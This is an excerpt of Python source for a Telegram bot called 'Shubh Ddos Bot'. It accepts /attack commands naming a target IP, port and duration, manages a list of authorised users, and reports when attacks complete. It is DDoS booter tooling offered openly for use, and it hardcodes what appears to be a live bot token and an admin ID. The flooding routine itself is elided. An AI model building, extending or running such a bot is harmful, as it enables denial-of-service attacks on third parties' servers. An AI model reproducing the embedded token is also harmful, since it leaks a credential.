...
TELEGRAM_BOT_TOKEN = '7244934052:AAH0AuXy-YEUSYKTdRvMkwHVYUSgVz6-sgM'
ADMIN_USER_ID = 1434287051
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        "*🔥 Welcome to the Shubh Ddos Bot🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let Start Fucking ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def Shubh(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args
    ...
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /Shubh <add|rem> <user_id>*", parse_mode='Markdown')
        return
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        ...
        attack_in_progress = False
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our Shubh Ddos Bot!*", parse_mode='Markdown')
...
def main():
    ...
    application.add_handler(CommandHandler("Shubh", Shubh))
